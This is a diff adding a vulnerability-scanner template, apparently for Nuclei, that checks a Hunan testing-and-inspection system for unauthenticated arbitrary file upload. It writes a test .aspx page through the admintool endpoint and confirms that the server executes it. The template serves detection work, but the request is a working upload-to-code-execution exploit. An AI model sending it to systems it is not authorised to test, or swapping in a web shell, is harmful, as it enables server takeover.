@@ -1,0 +1,38 @@
+id: hunanjianyanjiancexitong-admintool-fileupload
+
+info:
+  name: hunanjianyanjiancexitong-admintool-fileupload
+  author: msk
+  severity: high
+  reference:
+    - https://mp.weixin.qq.com/s/xhgCN-CxGtu5haP9tRQO4g
+
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}.aspx"
+http:
+  - raw:
+      - |
+        POST /Scripts/admintool?type=updatefile HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:92.0) Gecko/20100101 Firefox/92.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        
+        filePath={{file_name}}&fileContent=<%@ Page Language="C#"%><% Response.Write(1234*1234);%>
+
+      - |
+        GET /Scripts/{{file_name}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:92.0) Gecko/20100101 Firefox/92.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Connection: close
+        
+    
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1==200 && contains(body_1,file_name) && contains(body_2,'1522756')"
